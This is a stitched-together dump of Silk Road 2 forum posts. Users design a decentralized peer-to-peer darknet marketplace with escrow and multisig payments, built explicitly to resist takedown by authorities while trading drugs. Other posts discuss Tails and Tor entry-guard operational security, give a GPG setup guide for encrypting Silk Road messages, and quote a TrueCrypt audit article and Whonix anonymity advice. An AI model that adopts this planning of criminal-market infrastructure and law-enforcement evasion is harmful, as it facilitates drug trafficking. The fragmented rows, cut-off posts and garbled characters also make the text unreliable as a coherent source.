escrow build it into the deal. 50% of funds up front to the vendor, 50% after product arrives. There is absolutely no need for a middle agent to have such a system in place.    You could use n-out-of-x signatures or something similar, Bitcoin already has this built into it afaik. But really escrow is a huge waste of time, nobody knows if a vendor scammed a person or not.    C or C++ are better languages, especially for the cryptographic functions. ","A sufficiently sophisticated adversary can penetrate hidden services by a number of means.  Hackers and well connected state actors will often have access to ""0-day vulnerabilities"".  These 0day vulnerabilities allow attackers to subvert the actual software running the market (such as nginx, Apache, or forum software) to access secret information, such as the physical location of the server or private messages between buyers and sellers.  Thus any market is constantly threatened by any well connected adversary with access to 0day exploits.;   The third and perhaps most important vulnerability relies on social engineering.  Market administrators are often targeted by authorities in order to gain personal information such as physical addresses or usernames and passwords that would give them further leverage in attacking the market itself.  SR1 fell victim to this sort of attack, after which authorities had complete access to private messages exchanged between users.;   Peer to Peer markets represent the next logical step for darknet markets.  P2P protocols already underpin many technologies such as TOR, I2P, and BitCoin.  A distributed hash table (DHT) overlay network represents a logical choice for market implementation.  No single server or point of failure means the market is almost impervious to take-down by the authorities. The DHT would be implemented over I2P to provide anonymity and network resilience.  Public key cryptography is used for authentication and encryption of messages.  Trust is controlled and assigned by a central authority (the ""market organizer"" or MO).  The MO would possess a self signed certificate that is widely distributed in the network and hardcoded in various locations (such as the client software) to insure that it cannot be altered.;Joining the market would be a relatively straightforward process: potential participants would submit their individual public keys (PK) to the MO for signing, after which they are pushed to the DHT, associated with the user's nickname.  Sellers, in addition to having their nickname linked to their PK would have their nickname published by the MO to a digitally signed list of authorized sellers.  Using a certificate authority PKI provides a number of important trust controls in the market.  At any time the MO can revoke a certificate in case of unscrupulous buyers and sellers.  All published data can be quickly verified by the certificate chain, making malicious users an inconsequential nuisance.  Because all messages are encrypted between the corresponding parties, authorities have nothing to gain by the open nature of a DHT.;Private messages can easily be exchanged by parties by storing them in the DHT and removing them once they have been read.  Because they will be encrypted with GPG or a comparable system, their presence on the market does not provide any information to authorities.  Private messages can be used to arrange sales and resolve transaction disputes.;Sales would be executed in the form of contracts digitally signed by both parties and pushed to the DHT.  These contracts would act as chains, lengthened by feedback from both the buyer and the sellers about the transaction which would include a 1-5 rating on delivery, product, and payment.  Contract lists are easily accessible via the table and provide a built-in feedback system for users to evaluate other parties.  Users with unacceptably low feedback can be pruned from the market by revoking their certificate.;   Payment through the market could be organized by various means, the simplest of which will be outlined here.  In its most basic form, the seller will provide a coin address for the buyer to remit payment.  Upon payment, the goods are delivered.  Should the user fail to provide payment or the seller fails to send goods, negative feedback in the comment chain is the user's only recourse.  Alternative methods will be discussed below along with their advantages and disadvantages.  ;Distributed hash table overlay networks exhibit a number of benefits.  Because there is no single point of failure, there is no single resource or server that authorities can target.  Seizing any single node does not negatively impact the performance of the market.  Market stability can easily be maintained by utilizing ""supernodes"" as multiple servers hosted by both the MO and market participants which will increase resilience to attack.  Using the I2P routing network provides an anonymous backdrop over which transactions will occur.  Built in encryption means an adversary has little to gain by penetrating any individual user.  Using an overlay network means any number of MO's can operate independently, giving users a number of difference choices in sellers and platforms. Finally, using custom designed software limits the practicality of 0 day exploits.  Security through obscurity is not completely without merit.;The current implementation is not without limitations.  In our opinion, the most pressing issue is the potential for information leakage.  All contracts should be encrypted with the public key of the MO, since they will ultimately be responsible for dispute resolution and need access to said contracts.  But in order for feedback to be accessible to others, the parties involved must be known to everyone.  This information could be used to determine targets of interest (particularly large sellers) and perhaps determine buying patterns.  One must question whether the relevant authorities possess the sophistication to actually use this information.  It is a concern none the less.;   The second issue that deserves more attention is the payment system.  Up to this point, we have tried to limit the involvement of the MO such that trading can continue between identified market participants even if the MO is not present.  In addition, the MO collects no money and holds no funds.  In order to secure payment via an escrow type system, more trust must be allocated to either the MO or the market as a whole. ;Two potential solutions seem to exist.  First: the MO provides an escrow account and handles all payments.  This has the advantage of protecting buyers and sellers from unscrupulous users.  But it also makes the MO a much more active participant in the market, something that is not particularly desirable.  The alternative is using the entire market as an escrow.  Given a sufficiently large user base, each transaction could see a small percentage of the purchase coins distributed evenly to every participant as an escrow.  Once the buyer validates the transaction, the market software automatically forwards the payment to the seller.  This design would assume the motivation to steal the coins would be quite low.  This would require that the number of outstanding coins be a relatively small dollar amount relative to the number of peers.  This way, each peer only holds a small fraction of a dollar in escrow which would be useless for them to steal.;   A more practical issue is the actual implementation.  The market software will have to be custom designed.  It will have to run on any number of platforms, mainly Windows, OSX (darwin), and Linux.  This will necessitate a language that supports cross compilation such as golang or virtualization such as Java.  In addition, the supporting software (BitCoin and I2P) will have to be packaged in such a way that the entire experience is user friendly.  At the current time, we suggest implementing the market software as a local web server for the user interface and a JSON/AJAX exposed local service for market functionality."
"Silk Road 2 Forums","ketuvim","9277","2013-12-17T15:25:55","Future of darknet markets: DHT based P2P e-commerce","Discussion/Security","That is correct, but in the case of a HTTP web based service (such as silkroad, tor market, etc) there is a huge community of hackers searching for exploits in nginx, apache, SMF, etc.  By using custom software, we limit the number of hackers targeting our technology.  What disadvantages do you see in a P2P network?  As for the goals, I think they are quite clear.  Decentralize market infrastructure and built in encryption/verification security.  TOR already provides good anonymity and there is no need to reinvent the wheel.  We can adapt proven technology to our needs.  This market would obviously be accessed via TOR, that is a given.  You're making two mutually exclusive points.  You need a trusted third party to implement any sort of escrow and remove malicious users, so some centralization of authority is necessary.  It is the infrastructure that is largely decentralized.  You made a two different points here that I'll address one by one because I think they'll clear up some misconceptions other people may have as well.  First you ask why we need a CA.  This is because in a DHT, anyone can write any data to the table and overwrite anyone elses data.  That means an attacker could overwrite your public key information with their own, then anyone who pulls that key to send you a private message is actually writing a message to the attacker.  Thus certificates allow all network nodes to validate any data being pushed to make sure they come from the right person.  If the signature isn't right, the data is dropped.  Freedom Hosting is a dubious example because it is almost certain he will be extradited to the United States and charged there.  You do bring up an interesting point though, and its not unreasonable that items for sale would not be publically listed (they would have to be requested individually from users), giving the MO means for plausible deniability.  Unfortunately to guarantee stability in the market and maintain user trust, there has to be a way to remove scammers.  I can only assume you're referring to anonymizing layers such as cashmere or AP3.  Both are fantastic when there illegal traffic constitutes a minority of the network.  The issue is this: if everyone on your market place is selling/buying drugs and the government knows this, then all they do is subpoena a T1 ISP to packet filter anything that looks like your market, get addresses from the IP's, and stake out these people's mailboxes.  If everyone in your network mesh is doing something illegal, then routing the traffic around to hide its source is largely irrelevant.  That's why TOR is the logical option for implementing your chaum mix anonymizing layer.  That is an excellent idea.  At this time I just considered using the bitcoind JSON RPC.  It's possible though the every node in the network could serve as a mixing agent though.  Can you elaborate further on why I2P is less secure than say TOR or any other mix network?  What advantage does C or C++ offer over a language like Java or Go in practical terms for cryptography?  The only one I can think of is speed and this is irrelevant when the amount of data being encrypted per transaction is in the order of hundreds of bytes.  If anything, a C/C++ program is harder to write cross platform and more prone to buffer overflows etc.    There are two very important reason for P2P with a Certificate Authority and they both relate to potential attacks.  P2P is necessary to make a DDoS attack untenable for the attacker.  And without a CA to validate input, what would prevent a malicious user from filling your database completely with bunk user entries and growing the database exponentially, thus forcing nodes to either quit the market or actively delete information?  merge, your input is certainly appreciated here and you've provided some valuable insight into the process.","0-day attacks are an inherent risk of any software that isn't formally verified as secure. The only thing you can do is try to minimize the damage of such attacks. ;First of all, I don't think that full P2P is the way to go. It definitely has advantages, primarily in scalability, but it also has a lot of disadvantages.;Second of all, I know that a centralized market authority is a bad idea. It isn't required even in non-fully P2P systems, and it really goes against the idea of P2P as well. I am totally against centralized trust authorities. How can you trust the trust authority? The same sort of attack that you just talked about fucking SR1 would work against a system with a centralized trust authority. ;What is the point of a participants key being signed by a centralized trusted service? There is no point at all, the public key works as a unique and secure identifier regardless of if it is signed or not. I think that it is better if the clients nickname is derived from their public key, and other users can assign them whatever name they want as a nickname. How can we trust the market organizer to say that certain users are good or not? Also, why are we having this as an illegal program? The MO would apparently know that users are trafficking in drugs and illegal items. So they are breaking the law. The biggest benefit we can gain from a system like this is the fact that it isn't illegal to run it. Look at Freedom Hosting. The admin let people host CP and not he is going to go to prison because of it. The key here is that it had a centralized market operator if you will, and so he became a target. Now look at a freenet. It is a distributed network that lets people host CP. Nobody who runs a freenet node is going to prison, and Ian Clarke, the lead developer of Freenet, is a well respected computer scientist and not even anonymous. In practice there is not much of a difference at all between Freedom Hosting and Freenet, but legally there are important distinctions. The biggest mistake of the current markets is that they are designed for and openly engage in drug trafficking and other illegal activities, the future decentralized markets need to be neutral to the types of products sold on them and that means there cannot be some centralized market organizer who says he trusts drug traffickers and doesn't trust scammers. ;This works if you rely on existing anonymity networks to provide the anonymity of the market, but if you want to have really strong anonymity you need to put a lot more thought into your anonymity protocol. Myself and several others have been thinking of and designing and programming a distributed anonymous marketplace for the past several years and we are not even to the point where we can make our system scale to hundreds of thousands of users. This is after thousands and thousands of man hours researching and developing and testing anonymity protocols. Anonymity is hard, but if you are okay with using Tor grade anonymity you can skip this very hard part of the process (and it is hard to design and hard to code). ;We should build in a distributed trustless free to use blind mixing system, something based off of zerocoin.    ;Using I2P is a bad idea because it means that the anonymity of participants falls to anonymity provided by I2P. I don't understand everybody and their sudden interest in I2P, but trust me when I say it is NOT something that we want to use. Understand the difference between traffic analysis / SIGINT(not to mention between traceability, linkability, observability, etc), encryption/COMINT, etc. There are a lot of nuanced things to take into account and if you have an over simplified understanding of these things or start to lump them together into singular concepts you will be on a fast path to fucked.;C or C++ are better languages, especially for the cryptographic functions."

I think your idea for a legitimate chaun mix net is a wonderful idea, but until you've got tens of thousands of legitimate users in addition to your market users, it's just that: a wonderful idea.  The attacks you propose on TOR and I2P are completely in the realm of the theory, not practice.  In practice, TOR traffic is routed through multiple autonomous zones and has yet to be broken.  If we were selling nuclear secrets I'd worry about the NSA cracking the network, but if that's the case then RSA is useless anyway.  C or C++ is only one of many languages that does not copy objects in memory and does not have garbage collection.  The same security guarantees can be made by Go, x86 assembly, or any number of other languages.  You would be hard pressed to find any sane person that would tell you a C program is more secure by default than a java program.  We're not talking about attacking the JVM with a malicious code, we're talking about attacking an application on the JVM with malicious input.",""

Regardless, if we're worried about the NSA we should just quit now because I promise you they hire mathematicians and cryptographers who are 30 years ahead of anything we have.  TOR not only uses signed certificates for directory services (ie actually locating the hidden service), but it uses the TLS handshake to initiate encrypted connections.   AES is yet to be broken, should we all abandon that and find a new solution?  In cryptography, everything is unbroken until proven otherwise.  That is the nature of the beast.  I think you're misunderstanding the type of exploits that are reported for the JVM.  JVM exploits allow java code  the user has already downloaded to execute with higher than normal privileges.  This does not mean sending some malformed string to a java application over the web and this leading to say a buffer overflow.  Hence application security and interpreter security are unrelated in this instance.

"Silk Road 2 Forums","jrk1984","9277","2013-12-19T23:03:53","Future of darknet markets: DHT based P2P e-commerce","Discussion/Security","Problem with the current situation: * 1. it is run by a central authority. We rely on them to maintain servers with enoguh bandwidth, resolving escrow disputes etc. They also dictate what can be sold and who can sell according to their own morales. IMO SR has got it 100% correct (yes to drugs, no to guns, no to child porn), however 95% of the population agrees with the governments morales and say no to drugs - the point is we shouldn't have the market dictated by anybody's individual morales. * 2. it can be uncovered. We should act upon the assumption that the NSA can see the traffic at every node on the internet. By measuring the bandwidth at each node during a series of DoS attacks, they can use the process of elimination to find a hidden server on a low latency network, no matter if it is using TOR or I2P. * 3. it can be attacked - a DoS attack can take the market offline.  Components of a free, secure marketplace: * we need a way of seeing feedback for transactions, so that both buyers and seller can have a rank to establish trust * at the same time we need a way to ensure that buyers/sellers can't make multiple accounts and post fake feedback to boost their rank * we need the marketplace to be distributed * we need everything to be pseudonymous * we need an escrow for payments  The whole system must be an interaction between pseudonymous identities. I suggest that each identity has a unique public key, and this is how we identitfy each other. With the real IP address obscurred, people can then post 'messages' to a DHT, which can be signed by their corresponding private key. Anybody on the network can then download every valid message ever posted, and perform queries e.g. find all 'Transaction' and 'Feedback' messages which public key A was involved in.  Message structure: (all messages will have a timestamp as well to ease querying)    Transaction Init:       It says: both public key A, and public key B have agreed to an exchange. B will send product y to A in return for x bitcoins, which will be middlemanned by C. The bitcoin 2of3 multisig transaction is tx#1 on the bitcoin network, and the middleman 2of3 multisig transaction is tx#2.       It is identified by a unique transaction ID.       It must be signed by both A and B to be valid, otherwise it is ignored.        The bitcoin tansactions #1 and #2 must be valid 2of3 multisig transactions for keys A, B, and C. #1 is the payment from the buyer to the seller, #2 is a small payment from both the buyer and the seller to the middleman.       The public key C here is a middleman that A and B have agreed upon. The private key for C could actually be owned by a group of people forming a sort of 'middleman company'        Transaction Complete:       It says: transaction t between A and B with C as middleman has been completed.       It must be signed by two out of three from A, B, and C to be valid, otherwise it is ignored. Obviously, if B is one of the people signing it then the bitcoin transaction can be assumed to have been signed off too.       If signed by A and B then this is the normal circumstance, the middleman (C) didn't need to do anything. In this case transaction #2 is never completed and the middleman gets no money.       If signed by A and C then the seller was rogue. In this case transaction #1 is never completed, so the buyer doesn't lose his money, but #2 must be completed so that the middleman gets their fee.       If signed by B and C then the buyer was rogue. In this case both transactions must be completed, so the seller gets their money and the middleman gets their fee.           Feedback (seller by buyer):       It says: buyer A rates seller B as x stars out of 5 for transaction t. Here is a comment from A: <review text>.       It must be signed by A.       Transaction t must be a valid, completed transaction where A was one of the signers (i.e. the transaction either went fine or the middleman determined that the seller B was rogue).           Feedback (buyer by seller):       It says: Seller B rates buyer A as x out of 5 stars for transaction t. Here is a comment from B: <review text>.       It must be signed by B.       Transaction t must be a valid, completed transaction where B was one of the signers (i.e. the transaction either went fine or the middleman determined that the buyer A was rogue).   Preventing rank boosting with a web of trust: Currently on Silk Road:    * It is difficult to create spoof seller accounts because you need to pay a bond.    * It takes some work to create a spoof buyer account due to CAPTCHA, network time, and review being weighted on number of purchases.        In the proposed scenario there is nothing to prevent someone writing a script to generate 10000s of identities and filling out millions of fake transactions in a short space of time.     Solution:    Each person maintains a list of identities and how much they trust them. Say A and B complete a successful transaction. A could then assign a trust rating to B, and if they have made many successful transactions then the trust rating will be higher. When a new identity joins the network, they start off with 0 trust rating to everyone, so their feedback is weighted by 0 and counts for nothing. So if a new seller arrives and creates a bunch of sockpuppet buyer identities, then the seller and all the sockpuppets will have 0 trust by anybody else on the network - they will be in their own isolated bubble. Only once the sockpuppets buy from a legit vendor, and subsequently gain some trust, does the feedback start being recognised as valid.     Problems solved: * 2. The whole thing would be de-centralized so there is no central server that can be found and taken down. * 3. DoS attacks would be ineffective - performing a DoS against a significant proportion of TOR nodes is ineffetive. An adversary could spam invalid messages to the DHT, but these would be ignored by any nodes receiving and wouldn't be propagated for very long.  Problems: * Although both the buyer and the seller have to agree on a middleman, trusting the middleman is still a slight issue. If the middleman is ever involved at all, he will be getting negative feedback from one party and positive from the other, so any kind of feedback mechanism for the middlemen is useless. It will be possible for a middleman to be friends with a particular person, and keep resolving disputes in their favor. This is no different from the current system however, it is quite possible for the SR admins to resolve all escrow disputes in favor of a particular person to scam people. Active forums can help to mitigate this issue.  ",""

Thoughts? Nightcrawler et al?  -----  On Monday, after seven months of discussion and planning, the first-phase of a two-part audit of TrueCrypt was released.  The results? iSEC, the company contracted to review the bootloader and Windows kernel driver for any backdoor or related security issue, concluded (PDF) that TrueCrypt has: âno evidence of backdoors or otherwise intentionally malicious code in the assessed areas.â  While the team did find some minor vulnerabilities in the code itself, iSEC labeled them as appearing to be âunintentional, introduced a the result of bugs rather than malice.â  Since September 2013, a handful of cryptographers have been discussing new problems and alternatives to the popular security application. By February 2014, the Open Crypto Audit Projectâa new organization based in North Carolina that seeks formal 501(c)3 non-profit statusâraised around $80,000 towards this goal on various online fundraising sites.  ""[The results] don't panic me,â Matthew Green, a Johns Hopkins cryptography professor who has been one of the people leading this effort, told Ars. âI think the code quality is not as high as it should be, but on the other hand, nothing terrible is in there, so that's reassuringâ  Green said that the second phase was now to perform a âdetailed crypto review and make sure that thereâs no bug in the encryption.â  Specifically, the report continued:      Overall, the source code for both the bootloader and the Windows kernel driver did not meet expected standards for secure code. This includes issues such as lack of comments, use of insecure or deprecated functions, inconsistent variable types, and so forth. A more in-depth discussion on the quality issues identified can be found in Appendix B. In contrast to the TrueCrypt source code, the online documentation available at http://www.truecrypt.org/docs/ does a very good job at both describing TrueCrypt functionality and educating users on how to use TrueCrypt correctly. This includes recommendations to enable full disk encryption that protects the system disk, to help guard against swap, paging, and hibernation-based data leaks.      The team also found a potential weakness in the Volume Header integrity checks. Currently, integrity is provided using a string (âTRUEâ) and two (2) CRC32s. The current version of TrueCrypt utilizes XTS2 as the block cipher mode of operation, which lacks protection against modification; however, it is insufficiently malleable to be reliably attacked. The integrity protection can be bypassed, but XTS prevents a reliable attack, so it does not currently appear to be an issue. Nonetheless, it is not clear why a cryptographic hash or HMAC was not used instead.  Green also told Ars that he corresponded with one âDavid Morgan at TrueCrypt.com, who may or may not be a real personââthe softwareâs developers remain mysteriously anonymousâto inform them of the plan to do the audit and share the audit results.  The crypto professor said that Morgan acknowledged the Volume Header weakness but said that TrueCrypt âwas only supposed to protect you against certain thingsâ and not be as foolproof as some may like it.  âIt did not seem extremely important, but I think it's good to know about,â Green noted. âBut I think it's good that we didn't find anything super critical.â",""

The reliability somewhat increases as more audits get done from multiple angles, giving it more trust to a large group of both non- and technical users. It should be taken into account that security is not perfect because eventually it is created by humans. On the other hand, you can start appreciating security when considering it as an inconvenience to attackers.  All these papers only suggest that TrueCrypt has been secure in the past. What the future will bring us is unknown and there is no one who can give us a guarantee that it will remain secure. To take it to the extreme, it is even a possibility that TrueCrypt is not as secure as is claimed and that it is a project used to attract certain groups of users into using the program. When you use an application that provides disk encryption, it is more than likely that it is because you have something to hide. It would be a great point of attack, if pulled off correctly. It would take a huge amount of effort, however the results would be tremendous. Do not underestimate the abilities of security agencies.  It should, however, be noted that a point that is in TrueCrypt's favor is the fact that its source is available to anyone interested. Making it much less likely to be insecure. Especially due to actions performed by a certain group of users of the application, who run the risk of losing their freedom and perhaps even their lives if their data happens to get compromised.  History has shown vulnerabilities compromising data of great importance. An example of this is the recent OpenSSL Heartbleed bug, compromising the application's memory and thus giving attackers access to sensitive data (e.g. usernames and passwords).

The main downside to Tails is that it does not use persistent entry guards, increasing the risk that your traffic gets profiled over time.Tails 1.1.1 solved this problem: entry guard is now being rotated on certain basis.Skeetlord, the problem stemming from Tails' lack of persistent entry guards has not been solved. By design, Tails is a forensically amnesiac Live OS (as stated before), meaning that nothing is saved on the hard disk when you reeboot - unless you create a persistent partition. Even so, 1.1.1 does not automatically save TOR related config files on persistent partitions.That said, it is possible to manually edit the torrc config file every time you boot Tails and instruct TOR to connect to a specific guard or set of guards. The problem with connecting to one guard in particular (assuming you've set one up yourself or that you trust one in particular) is that your traffic looks different from other Tails and TOR users. And ironically, connecting to the same set of guards over time is a unique identifier. :\"
"Silk Road 2 Forums","proliferated","50498","2014-09-03T02:51:25","Is Tails really an essential???","Discussion/Security"," thank you.  100","Concerning Tails, the official clearnet website CLEARNET https://tails.boum.org offers all the info needed to be able to use it and have decent security while using it. Tails offers a good balance of usability and security. These days when people use insecure, dumbed down semi-functioning-computers ie. smartphones, tablets, useless gimmicks  (which are in reality just blatantly obvious tracking devices) and the like, as a daily distraction and even consider it an essential part of their lives; and every fucking thing is connected to the internet. Back in my day computers were used for computing. You got to get with the times but the times are sillier than ever.It's beyond me: How dare my TV-Set want to connect so some server probably for statisical evaluation of my data or the like.

You don't need to use Tails to stay safe. Tails DOES NOT increase your privacy or anonymity. Just use Tor Browser Bundle and have it configured properly.False. As far as privacy, tails is a forensically amnesiac live OS. If used properly, it can save your ass in the event that your laptop gets seized/falls ino the wrong hands. There is simply no evidence.Tails automatically spoofs your MAC address and it is also configured to connect to the internet via TOR. The main downside to Tails is that it does not use persistent entry guards, increasing the risk that your traffic gets profiled over time.On the flip side, just using TBB is not at as safe as GuroLolis claims. Even when ""configured properly."" Ask some of the people who got p0wned by feds and went to jail recently."

If I write something down and read it 10-15 times I generally can usually remember what it is - So all my passwords are a total random mix of letters and numbers but I can remember them all. I'm lucky, I guess.   Another tip for people creating passwords - use things scattered around the room. For example, if your laptop sits in your bedroom look around the room and look for mixes of things you can use for passwords, that way you never need to worry about hiding your passwords.  Another tip, if you have shoe boxes or boxes for shit you've bought before sitting around. Use a random word from the box/packaging and then use the barcode number or something similar. Works a treat. Just don't throw it out, please. ","Keepass is a way of storing passwords securly I believe although I have not used it. My brain is all the security I need "

Your only option then will be using the command-line.   If you have Snow Leopard (10.6), Lion (10.7) or Mountain Lion (10. , or Mavericks (10.9) the following instructions should be sufficient to allow you to get up and running.   Download and verify GPGTools (now known as GPGSuite):    How to verify the SHA-1 sum of the GPG Suite? (gpg not installed)  -   download the GPG Suite from https://gpgtools.org  -   open Terminal.app  -   enter ""shasum"" without the quotation marks  -   don't press ""enter"" just yet - first add a space and then drag the dmg file into the terminal -    press enter  The output will look similar to  ac7a636bfee1027d8f43a12a82eea54e7566dcb8 /Users/UserName/Downloads/GPG Suite - 2013.10.22.dmg  This number and the SHA-1 sum on our homepage should match.  The hash currently shown on the GPGTools webpage is: SHA-1: ac7a636bfee1027d8f43a12a82eea54e7566dcb8  Verify the hash of your downloaded file against the one I listed above. If they match, then you know for certain that the download is good.   Once you have verified the software as good, now install GPGTools.   Now that you have installed GPGTools,  what you want to do is to go into System Preferences --> Keyboard --> Services.  Scroll down until you find the following entries. Be sure to put a check mark in the boxes to activate each keyboard shortcut.   Keyboard shortcuts:  ==================  OpenPGP: Decrypt Selection:             Shift-Command-D  OpenPGP: Encrypt Selection:             Shift-Command-E  OpenPGP: Import Key from Selection:     Shift-Command-I  OpenPGP: Insert My Fingerprint:         Shift-Command-F  OpenPGP: Insert My Key:                 Shift-Command-K  OpenPGP: Sign Selection:                Shift-Command-R  OpenPGP: Verify Signature of Selection: Shift-Control-V   Remember, these shortcuts only operate on highlighted or selected text. N.B.: To properly be able to import PGP keys into GPGChain (via TextEdit) you need to change the default on TextEdit from .rtf to plain text. You can do that through the Format menu, or you can go through the main configuration menu, accessible by using Command-comma. Ensure the plain text radio button is selected. Also ensure that the following are UNCHECKED in TextEdit preferences: smart quotes, smart dashes, smart links.   To select text within TextEdit, use Command-A to highlight the entire document, or use your mouse to selection the section that you want to verify/sign/encrypt/decrypt. It is highly recommended that you use only plain-text, as opposed to Rich Text (.rtf) format. Use Command-comma to bring up Preferences and ensure that the plain text radio button is checked.   Once your text is highlighted in TextEdit, (by pressing Comand-A) you then encrypt using Shift-Command-E. You will then be presented with a list of keys to encrypt to, that you have added to your PGP keyring:   Other Commands You May Need: ============================  OpenPGP: Decrypt File:                   Control-Command-D  OpenPGP: Encrypt File:                   Control-Command-E  OpenPGP: Sign File:                      Control-Command-S  OpenPGP: Verify Signature of File:       Control-Command-V   Once you have setup these shortcuts, you can begin using GPG.   To encrypt a message to someone using GPG, you first need a copy of the recipient's PGP public key.   Once you have located someone's PGP public key, you should copy and paste it into TextEdit. Save the PGP key to a file; you can call the file, import.asc (or import.txt), for example. This saved file will usually be found in the Documents folder.   Launch GPG Keychain Access from the Applications folder. click on the Import icon in the upper left hand corner. GPG Keychain Access will then prompt you for the name of the file which contains the key to import. It will usually show you a list of files in the Documents folder. Click on the file named import.asc (or import.txt), and click ok. The PGP public key will then be imported into your PGP keyring.   To encrypt a message to a person, the message must be contained in a TextEdit document. Use Command-A to hightlight the entire document. Then use Shift-Command-E to encrypt. GPG will pop-up a list of public keys in your PGP keyring. Each key will have a little checkbox beside it which you can check, to select that particular key. If you were encrypting a message to me, you would put a check in the box beside my PGP key (Nightcrawler@SR).   When you click on OK, the plaintext (unencrypted) message in TextEdit will be replaced with the encrypted message. You can then copy and paste the encrypted message to enter it into a form on Silk Road, or anywhere else that it needs to go.   To decrypt a message sent to you by other people, you need to copy that message to the clipboard, and paste it into a TextEdit document. Again use Command-A to highlight all the encrypted message. Then use Shift-Command-D to decrypt the message. If the message is encrypted to your PGP public key, you will be prompted to enter your passphrase. Once the correct passphrase has been entered, and you click OK, then the message will be decrypted, and the decrypted text will be placed in the TextEdit document, replacing the encrypted message that was there previously.

It's transferred between servers across with no security around the From/To/Subject/Date/etc headers.  This means that an adversary, whether using access to one of the mail servers, or just passive Internet surveillance of the segments the messages are being sent over, can do impressive analysis of metadata.  Who you send messages to, who THEY send messages to, who THOSE people send messages to, and so on.  Clever encryption of the actual communications between SMTP servers doesn't solve this core problem.   2. The bar is so incredibly low for the difficulty in just grabbing all the headers and message sizes of SMTP traffic that flows through a pipe, any intelligence agency that *didn't* just grab all of them and crunch them should probably be shot for incompetance. 3. While the client can encrypt the messages with PGP, that just keeps the message body from being seen. 4. It's a store-and-forward technology.. you send a message to a mail server, it sits there until somebody picks it up, the server can keep a copy as long as they want 5. People are used to keeping emails around, and they will continue to do so until the end of time.  There are probably ways to improve it at a protocol level (everybody says use something with PFS, but I've yet to see a PFS method that actually works for a store-and-forward technology like email).  If the static message as delivered to the recipient contains everything necessary for the client to decrypt it an hour after it's sent, that's still true a decade after it's sent.  And if people are going to keep the cleartext version of something that was transferred securely, there's no technology that can keep that from happening.   OTR chat is a great example.  I can just keep a log of the damned chat.  Wahoo.. super awesome protocol defeated by me being an idiot.  You can make the argument that the cleartext version of the message doesn't have the mathematically verifiable *proof* that the message is genuine, and that's definitely true.  A GPG-signed message can be proven to be more trustworthy than a cleartext version of the same in the right circumstances. (having the recipients GPG private key)  But for those worried about legal ramifications of messages, regardless of how they're sent, it's not like mathematically provable integrity is actually needed in a court of law.  I can't wait to hear a defense attorney start out an argument with, ""But your honor.. since this is just a cleartext copy of a message from my client's hard drive, addressed to my client,  nobody can prove it's genuine.  Maybe my client edited it himself to make himself look guilty as fuck.""

""I wonder what my site looks like when I'm anonymous"" [1]  It's best not to visit your own personal website where either real names or pseudonyms (which have ever been tied to a non-Tor connection/IP) are attached. Because how many people are visiting your personal website? 90% of all Tor users, or just you, or just very few other people? That's weak anonymity. Once you visit a website your Tor circuit gets dirty. The exit relay knows that someone visited your website and if the site is not that popular, it's a good guess that 'someone' was you. It wouldn't be hard to assume that further connections originating from that exit relay come from your machine.  Source: [2] Login into your real life Facebook account and think you are anonymous.  Don't login into your personal Facebook account. No matter if your real name is attached or only a pseudonym. You most likely added your friends and they know who the account belongs to. Through your social network Facebook can guess who you are.  No anonymity solution is magic. Online anonymity software may reliable hide your IP/location. But Facebook does not need your IP/location. They already know who you are, who your friends are, which private messages you send and so on. All those data is at least stored on Facebook server. No kind of software can delete that data. Only Facebook and crackers could.  So if you log into your personal Facebook account you only get location privacy. No anonymity.  Quoted from ""To Toggle, or not to Toggle: The End of Torbutton""[3]:      mike, am i completely anonymized if i log onto my facebook account? im using firefox 3.6 with tor and no script on windows 7 machine. thank you.  Never login into accounts you ever used without Tor.  Always assume that each time you visit a website, that they will log the IP/location which visited the website, at which time and what you did.  Also assume, that each time you're online your ISP (Internet Service Provider) will log your online time, IP/location and perhaps traffic. Your ISP could also log to which IPs/locations you connected, how much traffic and what you send and retrieved. (Unless it's encrypted, then they'll see only garbage.) The following tables should give you an simplified overview how those logs could look like.  Website Log: Name    Time    IP/location    traffic    Content -    16.00 pm to 16.10 pm    1.1.1.1    1 megabytes    searched for thing one, thing two...  You'll see, when websites and ISP keep logs, no one needs Sherlock Holmes to conclude.  If you mess up for one time, and login with a non-Tor connection/IP, which can be tied to you, then the whole account is compromised. Don't login into your bank account, paypal, ebay or other important personal accounts unless...  Logging into your bank, paypal, ebay or other important personal accounts registered on your name where money is involved could risk, that your account gets suspended, due to ""suspicious activity"" by the fraud prevention system. This is because crackers sometimes use Tor for committing fraud. That's probably not what you want.  It's not anonymous for reasons already explained. It's pseudonymous and offers circumvention (in case access to the site is blocked by your ISP) and location privacy. The difference of anonymity and pseudonymity is covered in a later chapter on this page.  In many cases you will be able to contact the support and to get your account unblocked again or on request, even the fraud protection policy gets relaxed for your account.  Whonix developer adrelanos is not against using Tor for circumvention and/or location privacy, you just should know the risk of your account getting (temporarily) suspended and the other things mentioned on this page and the other warnings from the Whonix documentation. So if you know what you are doing, feel free. Don't alternate Tor with open WiFi.  You may think open WiFi is faster and equally safe as Tor since the IP/location cannot be tied to your real name, right?  It's better to use an open WiFi AND Tor, but not an open WiFi OR Tor.  The approximate location of any IP address can be tied down to a city, region or even a street. Even if you are away, you still gave away your city or approximate location since most people don't switch continents.  While this doesn't break your anonymity, the circle of suspect has decreased from the entire world, a continent, or the country to a region. This strongly hurts your anonymity. Keep as much information as possible to yourself. Prevent Tor over Tor scenarios.  Whonix specific.  When using a transparent proxy (Whonix includes one), it is possible to start a Tor session from the client as well as from the transparent proxy, creating a ""Tor over Tor"" scenario.  This happens when installing Tor inside Whonix-Workstation or when using the Tor Browser Bundle without configuring it to use a SocksPort instead of the TransPort. (Covered in the Tor Browser article.)  Doing so produces undefined and potentially unsafe behavior. In theory, however, you can get six hops instead of three, but it is not guaranteed that you'll get three different hops - you could end up with the same hops, maybe in reverse or mixed order. It is not clear if this is safe. It has never been discussed.  You can choose an entry/exit point [5], but you get the best security that Tor can provide when you leave the route selection to Tor; overriding the entry / exit relays can mess up your anonymity in ways we don't understand. Therefore Tor over Tor usage is highly discouraged.  License of ""Prevent Tor over Tor scenarios."": [6] Don't send sensitive data without end-to-end encryption.  As already explained on the Warning page, Tor exit relays can eavesdrop on communications and other Man-in-the-middle attacks can happen. The only way to get sensitive data from the sender to the recipient while withholding it from third parties, is using end-to-end encryption. Don't disclose identifying data about yourself.  Deanonymsation is not only possible with connections/IP addresses but by social threats too. Some recommendations to avoid deanonymisation collected by Anonymous:      Do not include personal informations in your nickname     Do not discuss personal informations, where you are from...     Do not mention your gender, tattos, piercings or physical capacities.     Do not mention your profession, hobbies or involvement in activist groups.     Do not use special characters on keyboard, which are existent only in your language.     Do not post informations to the regular internet while you are anonymous. Do not use Twitter and Facebook. This is easy to correlate.     Do not post links to 